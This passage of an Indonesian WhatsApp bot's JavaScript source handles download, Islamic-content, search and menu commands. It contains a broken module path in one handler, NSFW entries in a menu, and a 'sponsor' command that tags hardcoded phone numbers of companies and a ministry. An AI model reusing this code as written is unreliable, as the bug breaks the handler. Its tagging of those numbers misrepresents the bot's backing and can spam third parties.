                let msg = await MEYBotz.sendMessage(m.chat, buttonMessage, { quoted: m })
                MEYBotz.sendMessage(m.chat, { audio: { url: anu.result.audio } }, { quoted: msg })
            }
            break
	        case 'fbdl': case 'fb': case 'facebook': {
                if (!text) throw 'Masukkan Query Link!'
                m.reply(mess.wait)
                let anu = await fetchJson(api('zenz', '/api/downloader/facebook', { url: text }, 'apikey'))
                MEYBotz.sendMessage(m.chat, { video: { url: anu.result.url }, caption: `⌗ Title : ${anu.result.title}`}, { quoted: m })
            }
            break
	        case 'pindl': case 'pinterestdl': {
                if (!text) throw 'Masukkan Query Link!'
                m.reply(mess.wait)
                let anu = await fetchJson(api('zenz', '/api/downloader/pinterestdl', { url: text }, 'apikey'))
                MEYBotz.sendMessage(m.chat, { video: { url: anu.result }, caption: `Download From ${text}` }, { quoted: m })
            }
            break
            case 'umma': case 'ummadl': {
	        if (!text) throw `Example : ${prefix + command} https://umma.id/channel/video/post/gus-arafat-sumber-kecewa-84464612933698`
                let { umma } = require('./lib) scraper')
		let anu = await umma(isUrl(text)[0])
		if (anu.type == 'video') {
		    let buttons = [
                        {buttonId: `ytmp3 ${anu.media[0]} 128kbps`, buttonText: {displayText: '♫ Audio'}, type: 1},
                        {buttonId: `ytmp4 ${anu.media[0]} 360p`, buttonText: {displayText: '► Video'}, type: 1}
                    ]
		    let buttonMessage = {
		        image: { url: anu.author.profilePic },
			caption: `
⌗ Title : ${anu.title}
⌗ Author : ${anu.author.name}
⌗ Like : ${anu.like}
⌗ Caption : ${anu.caption}
⌗ Url : ${anu.media[0]}
Untuk Download Media Silahkan Klik salah satu Button dibawah ini atau masukkan command ytmp3/ytmp4 dengan url diatas
`,
			footer: MEYBotz.user.name,
			buttons,
			headerType: 4
		    }
		    MEYBotz.sendMessage(m.chat, buttonMessage, { quoted: m })
		} else if (anu.type == 'image') {
		    anu.media.map(async (url) => {
		        MEYBotz.sendMessage(m.chat, { image: { url }, caption: `⌗ Title : ${anu.title}\n⌗ Author : ${anu.author.name}\n⌗ Like : ${anu.like}\n⌗ Caption : ${anu.caption}` }, { quoted: m })
		    })
		}
	    }
	    break
        case 'ringtone': {
		if (!text) throw `Example : ${prefix + command} black rover`
        let { ringtone } = require('./lib/scraper')
		let anu = await ringtone(text)
		let result = anu[Math.floor(Math.random() * anu.length)]
		MEYBotz.sendMessage(m.chat, { audio: { url: result.audio }, fileName: result.title+'.mp3', mimetype: 'audio/mpeg' }, { quoted: m })
	    }
	    break
		case 'iqra': {
		oh = `Example : ${prefix + command} 3\n\nIQRA Yang tersedia : 1,2,3,4,5,6`
		if (!text) throw oh
		yy = await getBuffer(`https://islamic-api-indonesia.herokuapp.com/api/data/pdf/iqra${text}`)
		MEYBotz.sendMessage(m.chat, {document: yy, mimetype: 'application/pdf', fileName: `iqra${text}.pdf`}, {quoted:m}).catch ((err) => m.reply(oh))
		}
		break
		/**case 'juzamma': {
		if (args[0] === 'pdf') {
		m.reply(mess.wait)
		MEYBotz.sendMessage(m.chat, {document: {url: 'https://fatiharridho.my.id/database/islam/juz-amma-arab-latin-indonesia.pdf'}, mimetype: 'application/pdf', fileName: 'juz-amma-arab-latin-indonesia.pdf'}, {quoted:m})
		} else if (args[0] === 'docx') {
		m.reply(mess.wait)
		MEYBotz.sendMessage(m.chat, {document: {url: 'https://fatiharridho.my.id/database/islam/juz-amma-arab-latin-indonesia.docx'}, mimetype: 'application/vnd.openxmlformats-officedocument.wordprocessingml.document', fileName: 'juz-amma-arab-latin-indonesia.docx'}, {quoted:m})
		} else if (args[0] === 'pptx') {
		m.reply(mess.wait)
		MEYBotz.sendMessage(m.chat, {document: {url: 'https://fatiharridho.my.id/database/islam/juz-amma-arab-latin-indonesia.pptx'}, mimetype: 'application/vnd.openxmlformats-officedocument.presentationml.presentation', fileName: 'juz-amma-arab-latin-indonesia.pptx'}, {quoted:m})
		} else if (args[0] === 'xlsx') {
		m.reply(mess.wait)
		MEYBotz.sendMessage(m.chat, {document: {url: 'https://fatiharridho.my.id/database/islam/juz-amma-arab-latin-indonesia.xlsx'}, mimetype: 'application/vnd.openxmlformats-officedocument.spreadsheetml.sheet', fileName: 'juz-amma-arab-latin-indonesia.xlsx'}, {quoted:m})
		} else {
		m.reply(`Mau format apa ? Example : ${prefix + command} pdf

Format yang tersedia : pdf, docx, pptx, xlsx`)
		}
		}
		break**/
		case 'hadis': case 'hadist': {
		if (!args[0]) throw `Contoh:
${prefix + command} bukhari 1
${prefix + command} abu-daud 1

Pilihan tersedia:
abu-daud
1 - 4590
ahmad
1 - 26363
bukhari
1 - 7008
darimi
1 - 3367
ibnu-majah
1 - 4331
nasai
1 - 5662
malik
1 - 1594
muslim
1 - 5362`
		if (!args[1]) throw `Hadis yang ke berapa?\n\ncontoh:\n${prefix + command} muslim 1`
		try {
		let res = await fetchJson(`https://islamic-api-indonesia.herokuapp.com/api/data/json/hadith/${args[0]}`)
		let { number, arab, id } = res.find(v => v.number == args[1])
		m.reply(`No. ${number}

${arab}

${id}`)
		} catch (e) {
		m.reply(`Hadis tidak ditemukan !`)
		}
		}
		break
		case 'alquran': {
		if (!args[0]) throw `Contoh penggunaan:\n${prefix + command} 1 2\n\nmaka hasilnya adalah surah Al-Fatihah ayat 2 beserta audionya, dan ayatnya 1 aja`
		if (!args[1]) throw `Contoh penggunaan:\n${prefix + command} 1 2\n\nmaka hasilnya adalah surah Al-Fatihah ayat 2 beserta audionya, dan ayatnya 1 aja`
		let res = await fetchJson(`https://islamic-api-indonesia.herokuapp.com/api/data/quran?surah=${args[0]}&ayat=${args[1]}`)
		let txt = `*Arab* : ${res.result.data.text.arab}
*English* : ${res.result.data.translation.en}
*Indonesia* : ${res.result.data.translation.id}

( Q.S ${res.result.data.surah.name.transliteration.id} : ${res.result.data.number.inSurah} )`
		m.reply(txt)
		MEYBotz.sendMessage(m.chat, {audio: { url: res.result.data.audio.primary }, mimetype: 'audio/mpeg'}, { quoted : m })
		}
		break
		case 'tafsirsurah': {
		if (!args[0]) throw `Contoh penggunaan:\n${prefix + command} 1 2\n\nmaka hasilnya adalah tafsir surah Al-Fatihah ayat 2`
		if (!args[1]) throw `Contoh penggunaan:\n${prefix + command} 1 2\n\nmaka hasilnya adalah tafsir surah Al-Fatihah ayat 2`
		let res = await fetchJson(`https://islamic-api-indonesia.herokuapp.com/api/data/quran?surah=${args[0]}&ayat=${args[1]}`)
		let txt = `「 *Tafsir Surah*  」

*Pendek* : ${res.result.data.tafsir.id.short}

*Panjang* : ${res.result.data.tafsir.id.long}

( Q.S ${res.result.data.surah.name.transliteration.id} : ${res.result.data.number.inSurah} )`
		m.reply(txt)
		}
		break
		
		case 'playstore': {
            if (!text) throw `Example : ${prefix + command} clash of clans`
            let res = await fetchJson(api('zenz', '/webzone/playstore', { query: text }, 'apikey'))
            let teks = `⌗ Playstore Search From : ${text}\n\n`
            for (let i of res.result) {
            teks += `⌗ Name : ${i.name}\n`
            teks += `⌗ Link : ${i.link}\n`
            teks += `⌗ Developer : ${i.developer}\n`
            teks += `⌗ Link Developer : ${i.link_dev}\n\n──────────────────────\n`
            }
            m.reply(teks)
            }
            break
            case 'gsmarena': {
            if (!text) throw `Example : ${prefix + command} samsung`
            let res = await fetchJson(api('zenz', '/webzone/gsmarena', { query: text }, 'apikey'))
            let { judul, rilis, thumb, ukuran, type, storage, display, inchi, pixel, videoPixel, ram, chipset, batrai, merek_batre, detail } = res.result
let capt = `⌗ Title: ${judul}
⌗ Realease: ${rilis}
⌗ Size: ${ukuran}
⌗ Type: ${type}
⌗ Storage: ${storage}
⌗ Display: ${display}
⌗ Inchi: ${inchi}
⌗ Pixel: ${pixel}
⌗ Video Pixel: ${videoPixel}
⌗ Ram: ${ram}
⌗ Chipset: ${chipset}
⌗ Battery: ${batrai}
⌗ Battery Brand: ${merek_batre}
⌗ Detail: ${detail}`
            MEYBotz.sendImage(m.chat, thumb, capt, m)
            }
            break
            case 'jadwalbioskop': {
            if (!text) throw `Example: ${prefix + command} jakarta`
            let res = await fetchJson(api('zenz', '/webzone/jadwalbioskop', { kota: text }, 'apikey'))
            let capt = `Jadwal Bioskop From : ${text}\n\n`
            for (let i of res.result){
            capt += `⌗ Title: ${i.title}\n`
            capt += `⌗ Thumbnail: ${i.thumb}\n`
            capt += `⌗ Url: ${i.url}\n\n──────────────────────\n`
            }
            MEYBotz.sendImage(m.chat, res.result[0].thumb, capt, m)
            }
            break
            case 'nowplayingbioskop': {
            let res = await fetchJson(api('zenz', '/webzone/nowplayingbioskop', {}, 'apikey'))
            let capt = `Now Playing Bioskop\n\n`
            for (let i of res.result){
            capt += `⌗ Title: ${i.title}\n`
            capt += `⌗ Url: ${i.url}\n`
            capt += `⌗ Img Url: ${i.img}\n\n──────────────────────\n`
            }
            MEYBotz.sendImage(m.chat, res.result[0].img, capt, m)
            }
            break
            case 'aminio': {
            if (!text) throw `Example: ${prefix + command} free fire`
            let res = await fetchJson(api('zenz', '/webzone/amino', { query: text }, 'apikey'))
            let capt = `Amino Search From : ${text}\n\n`
            for (let i of res.result){
            capt += `⌗ Community: ${i.community}\n`
            capt += `⌗ Community Link: ${i.community_link}\n`
            capt += `⌗ Thumbnail: ${i.community_thumb}\n`
            capt += `⌗ Description: ${i.community_desc}\n`
            capt += `⌗ Member Count: ${i.member_count}\n\n──────────────────────\n`
            }
            MEYBotz.sendImage(m.chat, 'https://'+res.result[0].community_thumb, capt, m)
            }
            break
            case 'wattpad': {
            if (!text) throw `Example : ${prefix + command} love`
            let res = await fetchJson(api('zenz', '/webzone/wattpad', { query: text }, 'apikey'))
            let { judul, dibaca, divote, bab, waktu, url, thumb, description } = res.result[0]
            let capt = `Wattpad From ${text}\n\n`
            capt += `⌗ Judul: ${judul}\n`
            capt += `⌗ Dibaca: ${dibaca}\n`
            capt += `⌗ Divote: ${divote}\n`
            capt += `⌗ Bab: ${bab}\n`
            capt += `⌗ Waktu: ${waktu}\n`
            capt += `⌗ Url: ${url}\n`
            capt += `⌗ Deskripsi: ${description}`
            MEYBotz.sendImage(m.chat, thumb, capt, m)
            }
            break
            case 'webtoons': {
            if (!text) throw `Example : ${prefix + command} love`
            let res = await fetchJson(api('zenz', '/webzone/webtoons', { query: text }, 'apikey'))
            let capt = `Webtoons Search From : ${text}\n\n`
            for (let i of res.result) {
            capt += `⌗ Judul: ${i.judul}\n`
            capt += `⌗ Like: ${i.like}\n`
            capt += `⌗ Creator: ${i.creator}\n`
            capt += `⌗ Genre: ${i.genre}\n`
            capt += `⌗ Url: ${i.url}\n\n──────────────────────\n`
            }
            m.reply(capt)
            }
            break
            case 'drakor': {
            if (!text) throw `Example : ${prefix + command} love`
            let res = await fetchJson(api('zenz', '/webzone/drakor', { query: text }, 'apikey'))
            let capt = `Drakor Search From : ${text}\n\n`
            for (let i of res.result) {
            capt += `⌗ Judul: ${i.judul}\n`
            capt += `⌗ Years: ${i.years}\n`
            capt += `⌗ Genre: ${i.genre}\n`
            capt += `⌗ Url: ${i.url}\n`
            capt += `⌗ Thumbnail Url: ${i.thumbnail}\n\n──────────────────────\n`
            }
            MEYBotz.sendImage(m.chat, res.result[0].thumbnail, capt, m)
            }
            break

//PEMBATAS=======================================
            case 'rules': {
               goblok = fs.readFileSync('./sound/rules.mp3')
MEYBotz.sendMessage(m.chat, {audio: goblok, mimetype:'audio/mpeg', ptt:true }, {quoted:m})}
{
rules = `┌──⭓ *Rules BOT*
│
│ *No Spam & Telp❗*
│
└───────𖦹Ꜥꜥ`
let buttons = [{ buttonId: 'allmenu', buttonText: { displayText: '⌕ List Menu' }, type: 1 },{ buttonId: 'donasi', buttonText: { displayText: '👑Sewa' }, type: 1 }]
            await MEYBotz.sendButtonText(m.chat, buttons, rules, nyoutube, m, {quoted: fkontak})
            }
            break
            case 'sponsor': {
            if (!m.isGroup) throw mess.group
            let qontak = `6285718971848@s.whatsapp.net`
let dana = `6281911500445@s.whatsapp.net`
let shopeeotp = `6285574670796@s.whatsapp.net`
let shopee = `622150996855@s.whatsapp.net`
let tokopedia = `6281197911081@s.whatsapp.net`
let smartfrend = `628881212888@s.whatsapp.net`
let getcontact = `447990653714@s.whatsapp.net`
let facebook = `447710173736@s.whatsapp.net`
let pasarpolis = `6287700178000@s.whatsapp.net`
let kominfo = `628119224545@s.whatsapp.net`
let alfamart = `628111500959@s.whatsapp.net`
            let ownernya = ownernomer + '@s.whatsapp.net'
            let me = m.sender
            let jawab = `*Bot by MEYBotz cuy* 
-Creator :  @${ownernya.split('@')[0]}\n-Lu : @${me.split('@')[0]}\n-Powered  : @${ini_mark.split('@')[0]}\n- :  @${qontak.split('@')[0]}\n- :  @${dana.split('@')[0]}\n- :  @${shopeeotp.split('@')[0]}\n- :  @${shopee.split('@')[0]}\n- :  @${tokopedia.split('@')[0]}\n- :  @${smartfrend.split('@')[0]}\n- :  @${getcontact.split('@')[0]}\n- :  @${facebook.split('@')[0]}\n- :  @${pasarpolis.split('@')[0]}\n- :  @${getcontact.split('@')[0]}\n- :  @${kominfo.split('@')[0]}\n- :  @${alfamart.split('@')[0]}`
            let ments = [ownernya, me, ini_mark, qontak, dana, shopeeotp, shopee, tokopedia, smartfrend, getcontact, facebook, pasarpolis, kominfo, alfamart]
            let buttons = [
                        { buttonId: 'allmenu', buttonText: { displayText: '⌕ List Menu' }, type: 1 }
                    ]
                    await MEYBotz.sendButtonText(m.chat, buttons, jawab, MEYBotz.user.name, m, {mentions: ments})
            }
            break
            case 'menu': {
               goblok = fs.readFileSync('./sound/menu.mp3')
MEYBotz.sendMessage(m.chat, {audio: goblok, mimetype:'audio/mpeg', ptt:true }, {quoted:m})}
{
            let ownernya = ownernomer + '@s.whatsapp.net'
            let me = m.sender
            let jawab = `*${ucapanWaktu}*
╭──❏「 𝐈𝐍𝐅𝐎 𝐔𝐒𝐄𝐑 」❏*
├ *Nama* : ${pushname}
├ *Number* : @${me.split('@')[0]}
├ *Premium* : ${isPremium ? '✅' : `❌`}
├ *Limit* : ${isPremium ? '♾Infinity' : `〽️${db.data.users[m.sender].limit}`}
╰──❏

╭──❏「 𝐈𝐍𝐅𝐎 𝐁𝐎𝐓 」❏
├ *Nama Bot* : ${pushname}
├ *Powered* : @${ini_mark.split('@')[0]}
├ *Owner* : @${ownernya.split('@')[0]}
├ *Mode* : ${MEYBotz.public ? 'Public' : `Self`}
├ *Prefix* :「 MULTI-PREFIX 」
╰──❏

╭──❏「 𝐈𝐍𝐃𝐎𝐍𝐄𝐒𝐈𝐀 𝐓𝐈𝐌𝐄 」❏
├ *Hari Ini* : ${hariini}
├ *Wib* : ${barat} WIB
├ *Wita* : ${tengah} WITA
├ *Wit* : ${timur} WIT
╰──❏`
            let ments = [ownernya, me, ini_mark]
            let buttons = [{ buttonId: 'menuhost', buttonText: { displayText: '🔐 Menu Host' }, type: 1 },{ buttonId: 'rules', buttonText: { displayText: '⌕ Rules' }, type: 1 },{ buttonId: 'donasi', buttonText: { displayText: '⌕ Donasi' }, type: 1 }]
            await MEYBotz.sendButtonText(m.chat, buttons, jawab, nyoutube, m, {mentions: ments, quoted: fkontak})
            } 
break
            case 'simplemenu': case 'list': case 'help': {
            let ownernya = ownernomer + '@s.whatsapp.net'
            let me = m.sender
            let ments = [ownernya, me, ini_mark]
            let kukiw = `*${ucapanWaktu}*
╭──❏「 𝙄𝙉𝙁𝙊 𝙐𝙎𝙀𝙍 」❏
├ *Nama* : ${pushname}
├ *Number* : ${me.split('@')[0]}
├ *Premium* : ${isPremium ? '✅' : `❌`}
├ *Limit* : ${isPremium ? '♾Infinity' : `〽️${db.data.users[m.sender].limit}`}
╰──❏

╭──❏「 𝙄𝙉𝙁𝙊 𝘽𝙊𝙏 」❏
├ *Nama Bot* : ${pushname}
├ *Mode* : ${MEYBotz.public ? 'Public' : `Self`}
├ *Prefix* :「 MULTI-PREFIX 」
╰──

╭──❏「 𝙄𝙉𝘿𝙊𝙉𝙀𝙎𝙄𝘼𝙉 𝙏𝙄𝙈𝙀 」❏
├ *Hari Ini* : ${hariini}
├ *Wib* : ${barat} WIB
├ *Wita* : ${tengah} WITA
├ *Wit* : ${timur} WIT
╰──❏`
                let sections = [
                {
                title: "CHANGE MENU BOT",
                rows: [
                {title: "Group", rowId: `mgroup`, description: `👥Group Menu`},
                {title: "Webzone", rowId: `mwebzone`, description: `📹Webzone Menu`},
                {title: "Downloader", rowId: `mdownloader`, description: `📥Downloader Menu`},
                {title: "Search", rowId: `msearch`, description: `🔍Search Menu`},
                {title: "Random", rowId: `mrandom`, description: `❔Random Menu`},
                {title: "Text Pro", rowId: `mtextpro`, description: `❇Text Pro Menu`},
                {title: "Photo Oxy", rowId: `mphotooxy`, description: `♻️Photo Oxy Menu`},
                {title: "Ephoto", rowId: `mephoto`, description: `🗳Ephoto Menu`},
                {title: "Fun", rowId: `mfun`, description: `🔫Fun Menu`},
                {title: "Primbon", rowId: `mprimbon`, description: `😂Primbon Menu`},
                {title: "Convert", rowId: `mconvert`, description: `🛠Convert Menu`},
                {title: "Main", rowId: `mmain`, description: `💾Main Menu`},
                {title: "Database", rowId: `mdatabase`, description: `📁Database Menu`},
                {title: "Anonymous", rowId: `manonymous`, description: `🎭Anonymous Menu`},
                {title: "Islamic", rowId: `mislamic`, description: `🕌Islamic Menu`},
                {title: "Voice", rowId: `mvoice`, description: `🎶Voice Menu`},
                {title: "Owner", rowId: `mowner`, description: `🎟Owner Menu`}
                ]
                },
                ]
                MEYBotz.sendListMsg(m.chat, kukiw, nyoutube, `*Hello Kak ${pushname}*!`, `Pilih Menu`, sections, m, {quoted: fkontak})
            }
            break
            case 'mgroup': {
goup = `┌──⭓ *Group Menu*
│
│⭔ ${prefix}linkgroup
│⭔ ${prefix}ephemeral [option]
│⭔ ${prefix}setppgc [image]
│⭔ ${prefix}setname [text]
│⭔ ${prefix}setdesc [text]
│⭔ ${prefix}group [option]
│⭔ ${prefix}editinfo [option]
│⭔ ${prefix}add @user
│⭔ ${prefix}kick @user
│⭔ ${prefix}hidetag [text]
│⭔ ${prefix}tagall [text]
│⭔ ${prefix}antilink [on/off]
│⭔ ${prefix}mute [on/off]
│⭔ ${prefix}promote @user
│⭔ ${prefix}demote @user
│⭔ ${prefix}vote [text]
│⭔ ${prefix}devote
│⭔ ${prefix}upvote
│⭔ ${prefix}cekvote
│⭔ ${prefix}hapusvote
│
└───────𖦹Ꜥꜥ`
let buttons = [{ buttonId: 'simplemenu', buttonText: { displayText: '⬅️Back' }, type: 1 },{ buttonId: 'allmenu', buttonText: { displayText: '⌕ List Menu' }, type: 1 },{ buttonId: 'donasi', buttonText: { displayText: '⌕ Donasi' }, type: 1 }]
            await MEYBotz.sendButtonText(m.chat, buttons, goup, nyoutube, m, {quoted: fkontak})
            }
            break
      case 'mwebzone': {
wbzone = `┌──⭓ *Webzone Menu*
│
│⭔ ${prefix}playstore
│⭔ ${prefix}gsmarena
│⭔ ${prefix}jadwalbioskop
│⭔ ${prefix}nowplayingbioskop
│⭔ ${prefix}aminio
│⭔ ${prefix}wattpad
│⭔ ${prefix}webtoons
│⭔ ${prefix}drakor
│
└───────𖦹Ꜥꜥ`
let buttons = [{ buttonId: 'simplemenu', buttonText: { displayText: '⬅️Back' }, type: 1 },{ buttonId: 'allmenu', buttonText: { displayText: '⌕ List Menu' }, type: 1 },{ buttonId: 'donasi', buttonText: { displayText: '⌕ Donasi' }, type: 1 }]
            await MEYBotz.sendButtonText(m.chat, buttons, wbzone, nyoutube, m, {quoted: fkontak})
            }
            break
            case 'mdownloader': {
dwnloader = `┌──⭓ *Downloader Menu*
│
│⭔ ${prefix}tiktoknowm [url]
│⭔ ${prefix}tiktokwm [url]
│⭔ ${prefix}tiktokmp3 [url]
│⭔ ${prefix}instagram [url]
│⭔ ${prefix}twitter [url]
│⭔ ${prefix}twittermp3 [url]
│⭔ ${prefix}facebook [url]
│⭔ ${prefix}pinterestdl [url]
│⭔ ${prefix}ytmp3 [url]
│⭔ ${prefix}ytmp4 [url]
│⭔ ${prefix}getmusic [query]
│⭔ ${prefix}getvideo [query]
│⭔ ${prefix}umma [url]
│⭔ ${prefix}joox [query]
│⭔ ${prefix}soundcloud [url]
│
└───────𖦹Ꜥꜥ`
let buttons = [{ buttonId: 'simplemenu', buttonText: { displayText: '⬅️Back' }, type: 1 },{ buttonId: 'allmenu', buttonText: { displayText: '⌕ List Menu' }, type: 1 },{ buttonId: 'donasi', buttonText: { displayText: '⌕ Donasi' }, type: 1 }]
            await MEYBotz.sendButtonText(m.chat, buttons, dwnloader, nyoutube, m, {quoted: fkontak})
            }
            break
            case 'msearch': {
sarch = `┌──⭓ *Search Menu*
│
│⭔ ${prefix}play [query]
│⭔ ${prefix}yts [query]
│⭔ ${prefix}google [query]
│⭔ ${prefix}gimage [query]
│⭔ ${prefix}pinterest [query]
│⭔ ${prefix}wallpaper [query]
│⭔ ${prefix}wikimedia [query]
│⭔ ${prefix}ytsearch [query]
│⭔ ${prefix}ringtone [query]
│⭔ ${prefix}stalk [option] [query]
│
└───────𖦹Ꜥꜥ`
let buttons = [{ buttonId: 'simplemenu', buttonText: { displayText: '⬅️Back' }, type: 1 },{ buttonId: 'allmenu', buttonText: { displayText: '⌕ List Menu' }, type: 1 },{ buttonId: 'donasi', buttonText: { displayText: '⌕ Donasi' }, type: 1 }]
            await MEYBotz.sendButtonText(m.chat, buttons, sarch, nyoutube, m, {quoted: fkontak})
            }
            break
            case 'mrandom': {
rndom = `┌──⭓ *Random Menu*
│
│⭔ ${prefix}coffe
│⭔ ${prefix}quotesanime
│⭔ ${prefix}motivasi
│⭔ ${prefix}dilanquote
│⭔ ${prefix}bucinquote
│⭔ ${prefix}katasenja
│⭔ ${prefix}puisi
│⭔ ${prefix}couple
│⭔ ${prefix}anime
│⭔ ${prefix}waifu
│⭔ ${prefix}husbu
│⭔ ${prefix}neko
│⭔ ${prefix}shinobu
│⭔ ${prefix}waifus (nsfw)
│⭔ ${prefix}nekos (nsfw)
│⭔ ${prefix}trap (nsfw)
│⭔ ${prefix}blowjob (nsfw)
│
└───────𖦹Ꜥꜥ`
let buttons = [{ buttonId: 'simplemenu', buttonText: { displayText: '⬅️Back' }, type: 1 },{ buttonId: 'allmenu', buttonText: { displayText: '⌕ List Menu' }, type: 1 },{ buttonId: 'donasi', buttonText: { displayText: '⌕ Donasi' }, type: 1 }]
            await MEYBotz.sendButtonText(m.chat, buttons, rndom, nyoutube, m, {quoted: fkontak})
            }
            break
            case 'mtextpro': {
txtpro = `┌──⭓ *Text Pro Menu*
│
│⭔ ${prefix}3dchristmas
│⭔ ${prefix}3ddeepsea
│⭔ ${prefix}americanflag
│⭔ ${prefix}3dscifi
│⭔ ${prefix}3drainbow
│⭔ ${prefix}3dwaterpipe
│⭔ ${prefix}halloweenskeleton
│⭔ ${prefix}sketch
│⭔ ${prefix}bluecircuit
│⭔ ${prefix}space
│⭔ ${prefix}metallic
│⭔ ${prefix}fiction
│⭔ ${prefix}greenhorror
│⭔ ${prefix}transformer
│⭔ ${prefix}berry
│⭔ ${prefix}thunder
│⭔ ${prefix}magma
│⭔ ${prefix}3dcrackedstone
│⭔ ${prefix}3dneonlight
│⭔ ${prefix}impressiveglitch
│⭔ ${prefix}naturalleaves
│⭔ ${prefix}fireworksparkle
│⭔ ${prefix}matrix
│⭔ ${prefix}dropwater
│⭔ ${prefix}harrypotter
│⭔ ${prefix}foggywindow
│⭔ ${prefix}neondevils
│⭔ ${prefix}christmasholiday
│⭔ ${prefix}3dgradient
│⭔ ${prefix}blackpink
│⭔ ${prefix}gluetext
│
└───────𖦹Ꜥꜥ`
let buttons = [{ buttonId: 'simplemenu', buttonText: { displayText: '⬅️Back' }, type: 1 },{ buttonId: 'allmenu', buttonText: { displayText: '⌕ List Menu' }, type: 1 },{ buttonId: 'donasi', buttonText: { displayText: '⌕ Donasi' }, type: 1 }]
            await MEYBotz.sendButtonText(m.chat, buttons, txtpro, nyoutube, m, {quoted: fkontak})
            }
            break
            case 'mphotooxy': {
potooxy = `┌──⭓ *Photo Oxy Menu*
│
│⭔ ${prefix}shadow
│⭔ ${prefix}romantic
│⭔ ${prefix}smoke
│⭔ ${prefix}burnpapper
│⭔ ${prefix}naruto
│⭔ ${prefix}lovemsg
│⭔ ${prefix}grassmsg
│⭔ ${prefix}lovetext
│⭔ ${prefix}coffecup
│⭔ ${prefix}butterfly
│⭔ ${prefix}harrypotter
│⭔ ${prefix}retrolol
│
└───────𖦹Ꜥꜥ`
let buttons = [{ buttonId: 'simplemenu', buttonText: { displayText: '⬅️Back' }, type: 1 },{ buttonId: 'allmenu', buttonText: { displayText: '⌕ List Menu' }, type: 1 },{ buttonId: 'donasi', buttonText: { displayText: '⌕ Donasi' }, type: 1 }]
            await MEYBotz.sendButtonText(m.chat, buttons, potooxy, nyoutube, m, {quoted: fkontak})
            }
            break
            case 'mephoto': {
ehoto = `┌──⭓ *Ephoto Menu*
│
│⭔ ${prefix}ffcover
│⭔ ${prefix}crossfire
│⭔ ${prefix}galaxy
│⭔ ${prefix}glass
│⭔ ${prefix}neon
│⭔ ${prefix}beach
│⭔ ${prefix}blackpink
│⭔ ${prefix}igcertificate
│⭔ ${prefix}ytcertificate
│
└───────𖦹Ꜥꜥ`
let buttons = [{ buttonId: 'simplemenu', buttonText: { displayText: '⬅️Back' }, type: 1 },{ buttonId: 'allmenu', buttonText: { displayText: '⌕ List Menu' }, type: 1 },{ buttonId: 'donasi', buttonText: { displayText: '⌕ Donasi' }, type: 1 }]
            await MEYBotz.sendButtonText(m.chat, buttons, ehoto, nyoutube, m, {quoted: fkontak})
            }
            break
           case 'mfun': {
mun = `┌──⭓ *Fun Menu*
│
│⭔ ${prefix}simih
│⭔ ${prefix}halah
│⭔ ${prefix}hilih
│⭔ ${prefix}huluh
│⭔ ${prefix}heleh
│⭔ ${prefix}holoh
│⭔ ${prefix}jadian
│⭔ ${prefix}jodohku
│⭔ ${prefix}apakah
│⭔ ${prefix}bisakah
│⭔ ${prefix}kapan
│⭔ ${prefix}slot
│⭔ ${prefix}delttt
│⭔ ${prefix}tictactoe
│⭔ ${prefix}family100
│⭔ ${prefix}tebak [option]
│⭔ ${prefix}math [mode]
│⭔ ${prefix}suitpvp [@tag]
│
└───────𖦹Ꜥꜥ`
let buttons = [{ buttonId: 'simplemenu', buttonText: { displayText: '⬅️Back' }, type: 1 },{ buttonId: 'allmenu', buttonText: { displayText: '⌕ List Menu' }, type: 1 },{ buttonId: 'donasi', buttonText: { displayText: '⌕ Donasi' }, type: 1 }]
            await MEYBotz.sendButtonText(m.chat, buttons, mun, nyoutube, m, {quoted: fkontak})
            }
            break
            case 'mprimbon': {
pimbon = `┌──⭓ *Primbon Menu*
│
│⭔ ${prefix}nomorhoki
│⭔ ${prefix}artimimpi
│⭔ ${prefix}artinama
│⭔ ${prefix}ramaljodoh
│⭔ ${prefix}ramaljodohbali
│⭔ ${prefix}suamiistri
│⭔ ${prefix}ramalcinta
│⭔ ${prefix}cocoknama
│⭔ ${prefix}pasangan
│⭔ ${prefix}jadiannikah
│⭔ ${prefix}sifatusaha
│⭔ ${prefix}rezeki
│⭔ ${prefix}pekerjaan
│⭔ ${prefix}nasib
│⭔ ${prefix}penyakit
│⭔ ${prefix}tarot
│⭔ ${prefix}fengshui
│⭔ ${prefix}haribaik
│⭔ ${prefix}harisangar
│⭔ ${prefix}harisial
│⭔ ${prefix}nagahari
│⭔ ${prefix}arahrezeki
│⭔ ${prefix}peruntungan
│⭔ ${prefix}weton
│⭔ ${prefix}karakter
│⭔ ${prefix}keberuntungan
│⭔ ${prefix}memancing
│⭔ ${prefix}masasubur
│⭔ ${prefix}zodiak
│
└───────𖦹Ꜥꜥ`
let buttons = [{ buttonId: 'simplemenu', buttonText: { displayText: '⬅️Back' }, type: 1 },{ buttonId: 'allmenu', buttonText: { displayText: '⌕ List Menu' }, type: 1 },{ buttonId: 'donasi', buttonText: { displayText: '⌕ Donasi' }, type: 1 }]
            await MEYBotz.sendButtonText(m.chat, buttons, pimbon, nyoutube, m, {quoted: fkontak})
            }
            break
            case 'mconvert': {
cnvert = `┌──⭓ *Convert Menu*
│
│⭔ ${prefix}attp
│⭔ ${prefix}ttp
│⭔ ${prefix}toimage
│⭔ ${prefix}removebg
│⭔ ${prefix}sticker
│⭔ ${prefix}emojimix
│⭔ ${prefix}emojimix2
│⭔ ${prefix}tovideo
│⭔ ${prefix}togif
│⭔ ${prefix}tourl
│⭔ ${prefix}tovn
│⭔ ${prefix}tomp3
│⭔ ${prefix}toaudio
│⭔ ${prefix}ebinary
│⭔ ${prefix}dbinary
│⭔ ${prefix}styletext
│⭔ ${prefix}smeme
│
└───────𖦹Ꜥꜥ`
let buttons = [{ buttonId: 'simplemenu', buttonText: { displayText: '⬅️Back' }, type: 1 },{ buttonId: 'allmenu', buttonText: { displayText: '⌕ List Menu' }, type: 1 },{ buttonId: 'donasi', buttonText: { displayText: '⌕ Donasi' }, type: 1 }]
            await MEYBotz.sendButtonText(m.chat, buttons, cnvert, nyoutube, m, {quoted: fkontak})
            }
            break
            case 'mmain': {
min = `┌──⭓ *Main Menu*
│
│⭔ ${prefix}ping
│⭔ ${prefix}owner
│⭔ ${prefix}report
│⭔ ${prefix}menu / ${prefix}help / ${prefix}?
│⭔ ${prefix}delete
│⭔ ${prefix}infochat
│⭔ ${prefix}quoted
│⭔ ${prefix}listpc
│⭔ ${prefix}listgc
│⭔ ${prefix}listonline
│⭔ ${prefix}speedtest
│⭔ ${prefix}=es
│⭔ ${prefix}tinyurl
│⭔ ${prefix}isgd
│⭔ ${prefix}vurl
│⭔ ${prefix}clp
│
└───────𖦹Ꜥꜥ`
